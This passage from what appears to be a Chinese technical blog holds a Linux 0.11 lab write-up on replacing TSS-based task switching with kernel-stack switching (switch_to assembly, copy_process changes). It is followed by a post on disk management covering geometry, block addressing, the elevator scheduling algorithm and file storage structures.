LDT(next)); 4.4 实现 switch_to 实现 switch_to 是本次实践项目中最重要的一部分。\n由于要对内核栈进行精细的操作，所以需要用汇编代码来完成函数 switch_to 的编写。\n这个函数依次主要完成如下功能：由于是 C 语言调用汇编，所以需要首先在汇编中处理栈帧，即处理 ebp 寄存器；接下来要取出表示下一个进程 PCB 的参数，并和 current 做一个比较，如果等于 current，则什么也不用做；如果不等于 current，就开始进程切换，依次完成 PCB 的切换、TSS 中的内核栈指针的重写、内核栈的切换、LDT 的切换以及 PC 指针（即 CS:EIP）的切换。\nEBP 和 ESP 详解\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 switch_to: pushl %ebp movl %esp,%ebp pushl %ecx pushl %ebx pushl %eax movl 8(%ebp),%ebx cmpl %ebx,current je 1f ! 切换PCB ! ... ! TSS中的内核栈指针的重写 ! ... ! 切换内核栈 ! ... ! 切换LDT ! ... movl $0x17,%ecx mov %cx,%fs ! 和后面的 clts 配合来处理协处理器，由于和主题关系不大，此处不做论述 cmpl %eax,last_task_used_math jne 1f clts 1: popl %eax popl %ebx popl %ecx popl %ebp ret 虽然看起来完成了挺多的切换，但实际上每个部分都只有很简单的几条指令。完成 PCB 的切换可以采用下面两条指令，其中 ebx 是从参数中取出来的下一个进程的 PCB 指针，\n1 2 movl %ebx,%eax xchgl %eax,current 经过这两条指令以后，eax 指向现在的当前进程，ebx 指向下一个进程，全局变量 current 也指向下一个进程。\nTSS 中的内核栈指针的重写可以用下面三条指令完成，其中宏 ESP0 = 4，struct tss_struct *tss = \u0026amp;(init_task.task.tss); 也是定义了一个全局变量，和 current 类似，用来指向那一段 0 号进程的 TSS 内存。\n前面已经详细论述过，在中断的时候，要找到内核栈位置，并将用户态下的 SS:ESP，CS:EIP 以及 EFLAGS 这五个寄存器压到内核栈中，这是沟通用户栈（用户态）和内核栈（内核态）的关键桥梁，而找到内核栈位置就依靠 TR 指向的当前 TSS。\n现在虽然不使用 TSS 进行任务切换了，但是 Intel 的这态中断处理机制还要保持，所以仍然需要有一个当前 TSS，这个 TSS 就是我们定义的那个全局变量 tss，即 0 号进程的 tss，所有进程都共用这个 tss，任务切换时不再发生变化。\n1 2 3 movl tss,%ecx addl $4096,%ebx movl %ebx,ESP0(%ecx) 定义 ESP0 = 4 是因为 TSS 中内核栈指针 esp0 就放在偏移为 4 的地方，看一看 tss 的结构体定义就明白了。\n完成内核栈的切换也非常简单，和我们前面给出的论述完全一致，将寄存器 esp（内核栈使用到当前情况时的栈顶位置）的值保存到当前 PCB 中，再从下一个 PCB 中的对应位置上取出保存的内核栈栈顶放入 esp 寄存器，这样处理完以后，再使用内核栈时使用的就是下一个进程的内核栈了。\n由于现在的 Linux 0.11 的 PCB 定义中没有保存内核栈指针这个域（kernelstack），所以需要加上，而宏 KERNEL_STACK 就是你加的那个位置，当然将 kernelstack 域加在 task_struct 中的哪个位置都可以，但是在某些汇编文件中（主要是在 kernal/system_call.s 中）有些关于操作这个结构一些汇编硬编码，所以一旦增加了 kernelstack，这些硬编码需要跟着修改，由于第一个位置，即 long state 出现的汇编硬编码很多，所以 kernelstack 千万不要放置在 task_struct 中的第一个位置，当放在其他位置时，修改 kernal/system_call.s 中的那些硬编码就可以了。\n1 2 3 4 5 KERNEL_STACK = 12 movl %esp,KERNEL_STACK(%eax) ! 再取一下 ebx，因为前面修改过 ebx 的值 movl 8(%ebp),%ebx movl KERNEL_STACK(%ebx),%esp task_struct 的定义：\n1 2 3 4 5 6 7 // 在 include/linux/sched.h 中 struct task_struct { long state; long counter; long priority; long kernelstack; //...... 由于这里将 PCB 结构体的定义改变了，所以在产生 0 号进程的 PCB 初始化时也要跟着一起变化，需要将原来的 #define INIT_TASK { 0,15,15, 0,{{},},0,... 修改为 #define INIT_TASK { 0,15,15,PAGE_SIZE+(long)\u0026amp;init_task, 0,{{},},0,...，即在 PCB 的第四项中增加关于内核栈栈指针的初始化。\n再下一个切换就是 LDT 的切换了，指令 movl 12(%ebp),%ecx 负责取出对应 LDT(next)的那个参数，指令 lldt %cx 负责修改 LDTR 寄存器，一旦完成了修改，下一个进程在执行用户态程序时使用的映射表就是自己的 LDT 表了，地址空间实现了分离。\n最后一个切换是关于 PC 的切换，和前面论述的一致，依靠的就是 switch_to 的最后一句指令 ret，虽然简单，但背后发生的事却很多：schedule() 函数的最后调用了这个 switch_to 函数，所以这句指令 ret 就返回到下一个进程（目标进程）的 schedule() 函数的末尾，遇到的是}，继续 ret 回到调用的 schedule() 地方，是在中断处理中调用的，所以回到了中断处理中，就到了中断返回的地址，再调用 iret 就到了目标进程的用户态程序去执行，和书中论述的内核态线程切换的五段论是完全一致的。\n这里还有一个地方需要格外注意，那就是 switch_to 代码中在切换完 LDT 后的两句，即：\n1 2 3 ! 切换 LDT 之后 movl $0x17,%ecx mov %cx,%fs 这两句代码的含义是重新取一下段寄存器 fs 的值，这两句话必须要加、也必须要出现在切换完 LDT 之后，这是因为在实践项目 2 中曾经看到过 fs 的作用——通过 fs 访问进程的用户态内存，LDT 切换完成就意味着切换了分配给进程的用户态内存地址空间，所以前一个 fs 指向的是上一个进程的用户态内存，而现在需要执行下一个进程的用户态内存，所以就需要用这两条指令来重取 fs。\n不过，细心的读者可能会发现：fs 是一个选择子，即 fs 是一个指向描述符表项的指针，这个描述符才是指向实际的用户态内存的指针，所以上一个进程和下一个进程的 fs 实际上都是 0x17，真正找到不同的用户态内存是因为两个进程查的 LDT 表不一样，所以这样重置一下 fs=0x17 有用吗，有什么用？要回答这个问题就需要对段寄存器有更深刻的认识，实际上段寄存器包含两个部分：显式部分和隐式部分，如下图给出实例所示，就是那个著名的 jmpi 0, 8，虽然我们的指令是让 cs=8，但在执行这条指令时，会在段表（GDT）中找到 8 对应的那个描述符表项，取出基地址和段限长，除了完成和 eip 的累加算出 PC 以外，还会将取出的基地址和段限长放在 cs 的隐藏部分，即图中的基地址 0 和段限长 7FF。为什么要这样做？下次执行 jmp 100 时，由于 cs 没有改过，仍然是 8，所以可以不再去查 GDT 表，而是直接用其隐藏部分中的基地址 0 和 100 累加直接得到 PC，增加了执行指令的效率。现在想必明白了为什么重新设置 fs=0x17 了吧？而且为什么要出现在切换完 LDT 之后？\n图 3 段寄存器中的两个部分\n4.5 修改 fork 开始修改 fork() 了，和书中论述的原理一致，就是要把进程的用户栈、用户程序和其内核栈通过压在内核栈中的 SS:ESP，CS:IP 关联在一起。\n另外，由于 fork() 这个叉子的含义就是要让父子进程共用同一个代码、数据和堆栈，现在虽然是使用内核栈完成任务切换，但 fork() 的基本含义不会发生变化。\n将上面两段描述联立在一起，修改 fork() 的核心工作就是要形成如下图所示的子进程内核栈结构。\n图 4 fork 进程的父子进程结构\n不难想象，对 fork() 的修改就是对子进程的内核栈的初始化，在 fork() 的核心实现 copy_process 中，p = (struct task_struct *) get_free_page();用来完成申请一页内存作为子进程的 PCB，而 p 指针加上页面大小就是子进程的内核栈位置，所以语句 krnstack = (long *) (PAGE_SIZE + (long) p); 就可以找到子进程的内核栈位置，接下来就是初始化 krnstack 中的内容了。\n1 2 3 4 5 *(--krnstack) = ss \u0026amp; 0xffff; *(--krnstack) = esp; *(--krnstack) = eflags; *(--krnstack) = cs \u0026amp; 0xffff; *(--krnstack) = eip; 这五条语句就完成了上图所示的那个重要的关联，因为其中 ss,esp 等内容都是 copy_proces() 函数的参数，这些参数来自调用 copy_proces() 的进程的内核栈中，就是父进程的内核栈中，所以上面给出的指令不就是将父进程内核栈中的前五个内容拷贝到子进程的内核栈中，图中所示的关联不也就是一个拷贝吗？\n接下来的工作就需要和 switch_to 接在一起考虑了，故事从哪里开始呢？回顾一下前面给出来的 switch_to，应该从 “切换内核栈” 完事的那个地方开始，现在到子进程的内核栈开始工作了，接下来做的四次弹栈以及 ret 处理使用的都是子进程内核栈中的东西，\n1 2 3 4 5 1: popl %eax popl %ebx popl %ecx popl %ebp ret 为了能够顺利完成这些弹栈工作，子进程的内核栈中应该有这些内容，所以需要对 krnstack 进行初始化：\n1 2 3 4 5 *(--krnstack) = ebp; *(--krnstack) = ecx; *(--krnstack) = ebx; // 这里的 0 最有意思。 *(--krnstack) = 0; 现在到了 ret 指令了，这条指令要从内核栈中弹出一个 32 位数作为 EIP 跳去执行，所以需要弄一个函数地址（仍然是一段汇编程序，所以这个地址是这段汇编程序开始处的标号）并将其初始化到栈中。我们弄的一个名为 first_return_from_kernel 的汇编标号，然后可以用语句 *(--krnstack) = (long) first_return_from_kernel; 将这个地址初始化到子进程的内核栈中，现在执行 ret 以后就会跳转到 first_return_from_kernel 去执行了。\n想一想 first_return_from_kernel 要完成什么工作？PCB 切换完成、内核栈切换完成、LDT 切换完成，接下来应该那个“内核级线程切换五段论”中的最后一段切换了，即完成用户栈和用户代码的切换，依靠的核心指令就是 iret，当然在切换之前应该回复一下执行现场，主要就是 eax,ebx,ecx,edx,esi,edi,gs,fs,es,ds 等寄存器的恢复.\n下面给出了 first_return_from_kernel 的核心代码，当然 edx 等寄存器的值也应该先初始化到子进程内核栈，即 krnstack 中。\n1 2 3 4 5 6 7 8 popl %edx popl %edi popl %esi pop %gs pop %fs pop %es pop %ds iret 最后别忘了将存放在 PCB 中的内核栈指针修改到初始化完成时内核栈的栈顶，即：\n1 p-\u0026gt;kernelstack = stack; 实验步骤 1.修改/kernel/system_call.s文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 .globl system_call,sys_fork,timer_interrupt,sys_execve .globl hd_interrupt,floppy_interrupt,parallel_interrupt .globl device_not_available, coprocessor_error # 以上是原代码部分，以下是需要新建的代码 # system_call.s # 汇编语言中定义的方法可以被其他调用需要 .globl switch_to .globl first_return_from_kernel # 硬编码改变 these are offsets into the task-struct ESP0 = 4 KERNEL_STACK = 12 state\t= 0\t# these are offsets into the task-struct. counter\t= 4 priority = 8 kernelstack = 12 signal\t= 16 sigaction = 20\t# MUST be 16 (=len of sigaction) blocked = (37*16) switch_to: pushl %ebp movl %esp,%ebp pushl %ecx pushl %ebx pushl %eax movl 8(%ebp),%ebx cmpl %ebx,current je 1f # switch_to PCB movl %ebx,%eax xchgl %eax,current # rewrite TSS pointer movl tss,%ecx addl $4096,%ebx movl %ebx,ESP0(%ecx) # switch_to system core stack movl %esp,KERNEL_STACK(%eax) movl 8(%ebp),%ebx movl KERNEL_STACK(%ebx),%esp # switch_to LDT movl 12(%ebp), %ecx lldt %cx movl $0x17,%ecx mov %cx,%fs # nonsense cmpl %eax,last_task_used_math jne 1f clts 1: popl %eax popl %ebx popl %ecx popl %ebp ret .align 2 first_return_from_kernel: popl %edx popl %edi popl %esi pop %gs pop %fs pop %es pop %ds iret 该段代码完成的工作如下： 1.pushl %ebp 首先在汇编中处理栈帧，即处理 ebp 寄存器 2.cmpl %ebx,current 接下来要取出表示下一个进程 PCB 的参数，并和 current 做一个比较，如果等于 current，则什么也不用做。不等于 current，就开始进程切换。 3.switch_to PCB 完成 PCB 的切换 ebx是从参数中取出来的下一个进程的 PCB 指针，经过两条指令以后，eax 指向现在的当前进程，ebx指向下一个进程，全局变量 current 也指向下一个进程。 4.rewrite TSS pointer TSS 中的内核栈指针的重写 中断处理时需要寻找当前进程的内核栈，否则就不能从用户栈切到内核栈(中断处理没法完成)，内核栈的寻找是借助当前进程TSS中存放的信息来完成的。 5.switch_to system core stack内核栈的切换 将寄存器 esp（内核栈使用到当前情况时的栈顶位置）的值保存到当前 PCB 中，再从下一个 PCB 中的对应位置上取出保存的内核栈栈顶放入 esp寄存器，这样处理完以后，再使用内核栈时使用的就是下一个进程的内核栈了。 6.switch_to LDT LDT的切换 指令 movl 12(%ebp),%ecx 负责取出对应 LDT(next)的那个参数，指令 lldt %cx 负责修改 LDTR 寄存器，一旦完成了修改，下一个进程在执行用户态程序时使用的映射表就是自己的 LDT 表了，地址空间实现了分离。 最后，通过FS操作系统才能访问进程的用户态内存。这里LDT切换完成意味着切换到了新的用户态地址空间，所以需要重置FS。 代码截图如下（部分）: 2.修改/include/linux/sched.h文件 注释掉原来switch_to宏函数，截图如下： 基于堆栈的切换程序要做到承上启下：\n承上：基于堆栈的切换，要用到当前进程(current指向)与目标进程的PCB，当前进程与目标进程的内核栈等 Linux 0.11 进程的内核栈和该进程的 PCB 在同一页内存上（一块 4KB 大小的内存），其中 PCB 位于这页内存的低地址，栈位于这页内存的高地址 启下：要将next传递下去，虽然 TSS(next)不再需要了，但是 LDT(next)仍然是需要的。 之前的进程控制块(pcb)中是没有保存内核栈信息的寄存器的，所以需要在sched.h中的task_struct(也就是pcb)中添加kernelstack。 1 2 3 4 5 6 7 8 9 10 struct task_struct { /* these are hardcoded - don\u0026#39;t touch */ long state;\t/* -1 unrunnable, 0 runnable, \u0026gt;0 stopped */ long counter; long priority; //新增kernelstack long kernelstack; long signal; struct sigaction sigaction[32]; //...... 代码截图如下： 由于这里将 PCB 结构体的定义改变了，所以在产生 0 号进程的 PCB 初始化时也要跟着一起变化，需要修改 #define INIT_TASK，即在 PCB 的第四项中增加关于内核栈栈指针的初始化。\n1 2 3 #define INIT_TASK \\ /* state etc */\t{ 0,15,15,PAGE_SIZE+(long)\u0026amp;init_task, \\ //...... 代码截图如下: 3.修改/kernel/sched.c文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 // 添加的代码,定义tss struct task_struct *tss= \u0026amp;(init_task.task.tss); void schedule(void) { int i,next,c; struct task_struct ** p; struct task_struct *pnext = NULL; // 添加的代码,赋值初始化任务的指针 /* check alarm, wake up any interruptible tasks that have got a signal */ for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) { if ((*p)-\u0026gt;alarm \u0026amp;\u0026amp; (*p)-\u0026gt;alarm \u0026lt; jiffies) { (*p)-\u0026gt;signal |= (1\u0026lt;\u0026lt;(SIGALRM-1)); (*p)-\u0026gt;alarm = 0; } if (((*p)-\u0026gt;signal \u0026amp; ~(_BLOCKABLE \u0026amp; (*p)-\u0026gt;blocked)) \u0026amp;\u0026amp; (*p)-\u0026gt;state==TASK_INTERRUPTIBLE) (*p)-\u0026gt;state=TASK_RUNNING;\t} /* this is the scheduler proper: */ while (1) { c = -1; next = 0; // 添加的代码. 如果系统没有进程可以调度时传递进去的是一个空值，系统宕机， // 所以加上这句，这样就可以在next=0时不会有空指针传递 pnext = task[next]; i = NR_TASKS; p = \u0026amp;task[NR_TASKS]; while (--i) { if (!*--p) continue; if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter\u0026gt; c) c = (*p)-\u0026gt;counter, next = i, pnext=*p;// 修改添加的代码 } if (c) break; for(p = \u0026amp;LAST_TASK ; p \u0026gt; \u0026amp;FIRST_TASK ; --p) if (*p) (*p)-\u0026gt;counter = ((*p)-\u0026gt;counter \u0026gt;\u0026gt; 1) + (*p)-\u0026gt;priority; } //switch_to(next); switch_to(pnext, _LDT(next)); // 修改添加的代码 } 更改截图如下： 4.修改fork.c文件 对fork()的修改就是对子进程的内核栈的初始化，在fork()的核心实现copy_process中，p = (struct task_struct) get_free_page();用来完成申请一页内存作为子进程的PCB，而p指针加上页面大小就是子进程的内核栈位置. 所以需要再定义一个指针变量krnstack, 并将其初始化为内核栈顶指针, 然后再根据传递进来的参数把前一个进程的PCB中各种信息都保存到当前栈中。 可以将原代码copy_process函数注释，替换为以下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 //fork.c //6th extern void first_return_from_kernel(void); //fork.c copy_process() int copy_process(int nr,long ebp,long edi,long esi,long gs,long none, long ebx,long ecx,long edx, long fs,long es,long ds, long eip,long cs,long eflags,long esp,long ss) { struct task_struct *p; int i; struct file *f; long * krnstack; //1st p = (struct task_struct *) get_free_page(); if (!p) return -EAGAIN; task[nr] = p; *p = *current; /* NOTE! this doesn\u0026#39;t copy the supervisor stack */ p-\u0026gt;state = TASK_UNINTERRUPTIBLE; p-\u0026gt;pid = last_pid; p-\u0026gt;father = current-\u0026gt;pid; p-\u0026gt;counter = p-\u0026gt;priority; p-\u0026gt;signal = 0; p-\u0026gt;alarm = 0; p-\u0026gt;leader = 0; /* process leadership doesn\u0026#39;t inherit */ p-\u0026gt;utime = p-\u0026gt;stime = 0; p-\u0026gt;cutime = p-\u0026gt;cstime = 0; p-\u0026gt;start_time = jiffies; if (last_task_used_math == current) __asm__(\u0026#34;clts ; fnsave %0\u0026#34;::\u0026#34;m\u0026#34; (p-\u0026gt;tss.i387)); if (copy_mem(nr,p)) { task[nr] = NULL; free_page((long) p); return -EAGAIN; } //2nd krnstack = (long *) (PAGE_SIZE + (long) p); *(--krnstack) = ss \u0026amp; 0xffff; *(--krnstack) = esp; *(--krnstack) = eflags; *(--krnstack) = cs \u0026amp; 0xffff; *(--krnstack) = eip; *(--krnstack) = ds \u0026amp; 0xffff; *(--krnstack) = es \u0026amp; 0xffff; *(--krnstack) = fs \u0026amp; 0xffff; *(--krnstack) = gs \u0026amp; 0xffff; *(--krnstack) = esi; *(--krnstack) = edi; *(--krnstack) = edx; //3rd *(--krnstack) = first_return_from_kernel; //4th *(--krnstack) = ebp; *(--krnstack) = ecx; *(--krnstack) = ebx; *(--krnstack) = 0; //5th p-\u0026gt;kernelstack = krnstack; for (i=0; i\u0026lt;NR_OPEN;i++) if ((f=p-\u0026gt;filp[i])) f-\u0026gt;f_count++; if (current-\u0026gt;pwd) current-\u0026gt;pwd-\u0026gt;i_count++; if (current-\u0026gt;root) current-\u0026gt;root-\u0026gt;i_count++; if (current-\u0026gt;executable) current-\u0026gt;executable-\u0026gt;i_count++; set_tss_desc(gdt+(nr\u0026lt;\u0026lt;1)+FIRST_TSS_ENTRY,\u0026amp;(p-\u0026gt;tss)); set_ldt_desc(gdt+(nr\u0026lt;\u0026lt;1)+FIRST_LDT_ENTRY,\u0026amp;(p-\u0026gt;ldt)); p-\u0026gt;state = TASK_RUNNING; /* do this last, just in case */ return last_pid; } 5.验证结果 经过验证，用修改后的 Linux 0.11 仍然可以启动、可以正常使用。\n","permalink":"https://chance7bin.github.io/posts/basic/os-lab/%E5%AE%9E%E9%AA%8C5-%E5%9F%BA%E4%BA%8E%E5%86%85%E6%A0%B8%E6%A0%88%E5%88%87%E6%8D%A2%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%88%87%E6%8D%A2/","summary":"1.实验目的 深入理解进程和进程切换的概念； 综合应用进程、CPU 管理、PCB、LDT、内核栈、内核态等知识解决实际问题； 开始建立系统认识。 2.","title":"实验5 基于内核栈切换的进程切换"},{"content":"磁盘的管理(一) 前言 磁盘既是输入设备又是输出设备。 输出设备（OutputDevice）是人与计算机交互的一种部件，用于数据的输出。 输入设备：向计算机输入数据和信息的设备。\n所以，使用磁盘大致上与显示器和键盘一样\n提示：以下是本篇文章正文内容\n一、磁盘的介绍 磁盘由一个个盘片组成的磁盘立体结构，一个盘片上下两面都是可读写的\n磁盘利用了电流的磁效应，对一些电信号进行磁化，保存在磁盘中，用来表示一些信息。\n硬盘又划分为磁头（Heads）、柱面(Cylinder)、扇区(Sector)\n磁头(Heads)：每张盘面的正反两面各有一个磁头，一个磁头对应一张磁片的一个面。用第几磁头就可以表示数据在哪个磁面\n柱面(Cylinder)：所有盘面中半径相同的同心磁道构成“柱面”，这一系列的磁道垂直叠在一起，就形成一个柱面的形状\n扇区(Sector)：将磁道划分为若干个小的区段，就是扇区，每个扇区的容量为512字节，大小本质上是对磁盘数据的传输时间和磁盘的碎片浪费这2项参数的折中\n==硬盘容量＝磁头数×柱面数×扇区数×512字节==\n结构概况：\n二、生磁盘的使用 1.IO过程简介 ==磁盘I/O过程: 控制器–\u0026gt;寻道–\u0026gt;旋转–\u0026gt;传输==\n1.磁头移动到相应的磁道上 2.磁道开始旋转，转到相应的扇区 3.此时再转的时候就是磁生电，磁信号就变成电信号，然后就读取数据 4.读到内存的缓冲区，将这个内存缓冲区修改一个字节 5.然后继续里面再转，此时是电生磁，把字节写到磁道上\n==移动磁头，移动到对应的磁道上，然后转动磁道，移动到对应的扇区上，一边旋转一边进行磁生电，电生磁，和内存缓冲区进行数据的交互读和写==\n2.直接使用磁盘 只要往控制器中写柱面、 磁头、 扇区、 缓存位置\n假如要往磁盘的某个扇区写一个字节，那么需要知道这个扇区对应的哪个柱面中的哪个磁头把这些参数传到磁盘控制器，磁盘控制器再根据这些参数进行驱动磁盘写数据\n(1)磁盘读写的请求函数do_hd_request()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 void do_hd_request(void) { ..... //前面一些语句就是要得到dev,nsect,sec,head,cyl，WIN_WRITE,\u0026amp;write_intr数据 // 传递给磁盘控制器 if (CURRENT-\u0026gt;cmd == WRITE) { hd_out(dev,nsect,sec,head,cyl,WIN_WRITE,\u0026amp;write_intr); for(i=0 ; i\u0026lt;3000 \u0026amp;\u0026amp; !(r=inb_p(HD_STATUS)\u0026amp;DRQ_STAT) ; i++) /* nothing */ ; if (!r) { bad_rw_intr(); goto repeat; } port_write(HD_DATA,CURRENT-\u0026gt;buffer,256); } else if (CURRENT-\u0026gt;cmd == READ) { hd_out(dev,nsect,sec,head,cyl,WIN_READ,\u0026amp;read_intr); } else panic(\u0026#34;unknown hd-command\u0026#34;); } (2)磁盘驱动的核心代码hd_out()\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 static void hd_out(unsigned int drive,unsigned int nsect,unsigned int sect, unsigned int head,unsigned int cyl,unsigned int cmd, void (*intr_addr)(void)) { register int port asm(\u0026#34;dx\u0026#34;); if (drive\u0026gt;1 || head\u0026gt;15) panic(\u0026#34;Trying to write bad sector\u0026#34;); if (!controller_ready()) panic(\u0026#34;HD controller not ready\u0026#34;); do_hd = intr_addr; outb_p(hd_info[drive].ctl,HD_CMD); port=HD_DATA; //数据寄存器端口(0x1f0) // outb_p接口就是往外设传送数据的 // cpu中磁盘驱动的核心代码 outb_p(hd_info[drive].wpcom\u0026gt;\u0026gt;2,++port); outb_p(nsect,++port); outb_p(sect,++port); outb_p(cyl,++port); outb_p(cyl\u0026gt;\u0026gt;8,++port); outb_p(0xA0|(drive\u0026lt;\u0026lt;4)|head,++port); outb(cmd,++port); } 以上方法需要的传递的参数太多，不够方便\n3.盘块号读写磁盘(第一层抽象) ==将柱面、磁头、扇区包装成一个磁盘块==\n磁盘驱动负责从block计算出cyl， head， sec(CHS)\n假设扇区的编址如下，(block相邻的盘块可以快速读出)\n1号扇区在0号扇区旋转方向的下一扇区，假设一个盘面有六个扇区，则0-5扇区在第一个盘面，6号扇区在0号扇区竖直方向的下的扇区\n计算公式：block = c * (heads * sectors) + h * sectors + s\nSectors 是每个盘面的扇区数，Heads 是磁盘的磁头数量\n扇区号 = 柱面号 × （一个柱面有多少扇区）+ 盘面号 ×（一个盘面有多少扇区）+ 扇区号\n==根据扇区号 sector 来算出 C、H、S==\nS = sector%Sectors H = sector/Sectors%Heads C = sector/Sectors/Heads\n通过编址建立从 C、H、S 扇区地址到扇区号的一个映射，这就是文件系统第一层抽象的中心任务。扇区号连续的多个扇区就是一个磁盘块\n磁盘的访问时间\n磁盘的访问时间 = 写入控制器时间 + 寻道时间 + 旋转时间 + 传输时间\n(其中主要是寻道时间, 旋转时间长，同时相邻的盘块应能快速读出)\n通过磁盘号进行读写磁盘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 static void make_request() { struct requset *req; req=request+NR_REQUEST; req-\u0026gt;sector=bh-\u0026gt;b_blocknr\u0026lt;\u0026lt;1; add_request(major+blk_dev,req); } void do_hd_request(void) { unsigned int block=CURRENT-\u0026gt;sector; __asm__(“divl %4”:”=a”(block),”=d”(sec):”0”(block), “1”(0),”r”(hd_info[dev].sect)); __asm__(“divl %4”:”=a”(cyl),”=d”(head):”0”(block), “1”(0),”r”(hd_info[dev].head)); hd_out(dev,nsect,sec,head,cyl,WIN_WRITE,...); ... } 有了磁盘块，用户发出的磁盘读写请求就是盘块号 blocknr 了，由于磁盘块是连续的多个扇区，可以容易地算出扇区号，即：sector = blocknr × blocksize（ blocksize 是描述磁盘块大小）\n4.队列读写磁盘(第二层抽象) 操作系统中一般有多个进程，每个进程都会提出磁盘块访问请求，所以需要用队列来管理访问请求，这就是操作系统对磁盘管理的第二层抽象\n多个磁盘访问请求出现在请求队列，需要对磁盘进行调度\n调度目标：平均延迟小 调度算法：\n(1)FCFS磁盘调度算法 最直观最公平的调度\n(2)SSTF磁盘调度 在移动过程中把经过的请求处理(Shortest-seek-time First)\n(3)SCAN磁盘调度 SSTF+中途不回折： 每个请求都有处理机会\n(4)C-SCAN磁盘调度(电梯算法) SCAN+直接移到另一端： 两端请求都能很快处理\n这借鉴了生活中电梯的模型，电梯在运行的时候有上升和下降2种情况，当电梯上升时，本次上升的终点就是最高的请求楼层; 当电梯下降时，本次下降的终点就是最低的请求楼层\nIN_ORDER()\n1 2 3 4 5 6 7 8 9 // 核心思想是比较s1与s2中的sector大小 // 也就是比较s1与s2中的柱面号的大小 // 因为柱面的寻找是耗时最长的，所以要保证 // 寻找柱面也即寻道的时间不能太长，就要在 // 寻道上面做优化处理 #define IN_ORDER(s1,s2) ((s1)-\u0026gt;cmd\u0026lt;(s2)-\u0026gt;cmd || ((s1)-\u0026gt;cmd==(s2)-\u0026gt;cmd \u0026amp;\u0026amp; ((s1)-\u0026gt;dev \u0026lt; (s2)-\u0026gt;dev || ((s1)-\u0026gt;dev == (s2)-\u0026gt;dev \u0026amp;\u0026amp; (s1)-\u0026gt;sector \u0026lt; (s2)-\u0026gt;sector)))) 知道了IN_ORDER()的作用，可以分析一下电梯算法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 // linux-0.11/kernel/blk_drv/ll_rw_blk.c static void add_request(struct blk_dev_struct * dev, struct request * req) { struct request * tmp; req-\u0026gt;next = NULL; cli(); // 开启临界区保护 if (req-\u0026gt;bh) req-\u0026gt;bh-\u0026gt;b_dirt = 0; if (!(tmp = dev-\u0026gt;current_request)) { dev-\u0026gt;current_request = req; sti(); (dev-\u0026gt;request_fn)(); return; } //当符合这两种情况时就跳出循环 // 并将req插入tmp和next之间 //(1)当tmp的柱面号小于req的柱面号，且req小于next的柱面号(电梯上升) //(2)当tmp的柱面号小于next的柱面号，且req小于next的柱面号(电梯下降) // 不管这两种任何一种情况， // 下一步磁盘读写都会进入req这个对象上 //否则就按照原有的,队列进行磁盘读写 //这样就能更高效的使用磁盘 for ( ; tmp-\u0026gt;next ; tmp=tmp-\u0026gt;next) if ((IN_ORDER(tmp,req) || !IN_ORDER(tmp,tmp-\u0026gt;next)) \u0026amp;\u0026amp; IN_ORDER(req,tmp-\u0026gt;next)) break; req-\u0026gt;next=tmp-\u0026gt;next; tmp-\u0026gt;next=req; sti(); } 总结 小结：==生磁盘(raw disk)写过程==\n磁盘的管理(二) 前言 如果让普通用户使用生磁盘(raw disk)，许多人连扇区都不知道是什么?要求他们根据盘块号来访问磁盘…这是不可能的。 所以，需要在盘块上引入更高一层次的抽象概念—文件\n一、磁盘文件 ==磁盘使用的第三层抽象——文件，文件是一个连续的字符流==\n用户可以在字符流上随意操作，操作系统会根据==映射表找到和字符流位置对应的磁盘块号==，操作系统完成了从磁盘块到字符流的映射。\n实现文件抽象的关键就在于能根据字符流位置找到对应的盘块号，即字符流和盘块号之间的映射关系，==文件: 建立字符流到盘块集合的映射关系==\n1.顺序存储结构 文件使用顺序结构储存在磁盘上，==文件的FCB(文件控制块)存储该文件的起始块号(第一个)，和块数==，根据这个就能知道对应的字符在那个盘块\n若盘块的大小为100，则文件中200-212对应在盘块8\n但是，用顺序存储的结构适合文件的直接读写，不适合文件的动态增长，与数组一样，不方便插入元素\n2.链式存储结构 链式存储结构：操作系统在 FCB 中需要存放的主要映射信息是==第一个磁盘块的盘块号==，利用这个信息可以找到文件的第一个磁盘块，再利用每个磁盘块中存放的下一个盘块号的指针，可以找到第二个磁盘块……\n若盘块的大小为100，则文件中200-212对应在盘块9\n3.索引存储结构 索引存储结构：文件字符流被分割成多个逻辑块，在物理磁盘上寻找一些空闲物理盘块（无需连续）将这些逻辑块的内容存放进去，再找一个磁盘块作为索引块，其中按序存放各个逻辑块对应的物理磁盘块号(索引块来记录文件使用的盘块号) 索引结构指一个文件的信息存放在若干不连续的物理块中，系统为每个文件建立一个专用的数据结构——索引表，并将这些块的块号存放在索引表中。\n优点是保留了链接结构的优点，同时解决了其缺点，即能顺序存取，又能随机存取，满足了文件动态增长，插入删除的需求，也能充分利用外存空间\n缺点是索引表本身带来一定的系统开销\n==多级索引：== 优点：\n1.可以表示很大的文件 2.很小的文件高效访问 3.中等大小的文件访问速度也不慢\n二、文件读取磁盘(第三层抽象) 通过文件对磁盘进行读写\n1 2 3 4 5 6 7 8 在fs/read_write.c中 int sys_write(int fd, const char* buf, int count) { struct file *file = current-\u0026gt;filp[fd]; struct m_inode *inode = file-\u0026gt;inode; if(S_ISREG(inode-\u0026gt;i_mode)) return file_write(inode, file, buf, count); } 